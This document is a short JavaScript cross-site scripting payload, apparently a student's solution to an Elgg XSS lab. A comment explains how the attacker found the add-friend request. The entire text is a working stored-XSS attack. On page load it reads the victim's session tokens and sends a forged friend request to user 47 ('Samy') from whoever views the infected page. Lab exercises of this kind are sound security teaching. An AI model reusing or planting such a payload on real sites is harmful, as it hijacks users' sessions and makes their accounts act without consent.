<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;

	
	var sendurl= "http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token; 
	if(elgg.session.user.guid!= elgg.page_owner.guid){  //samy is 47
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();

	} 

/* I have at first send a friend request to Samy from Alice’s id and by inspecting the network tab I
have found the request URL. THen I have appended the ts and token with the URL and got the
full HTTP GET request. Samy should not be able to attack himself, so I have found the user
guid of samy and added a condition that any user except samy will have this attack. */

	
}
</script>
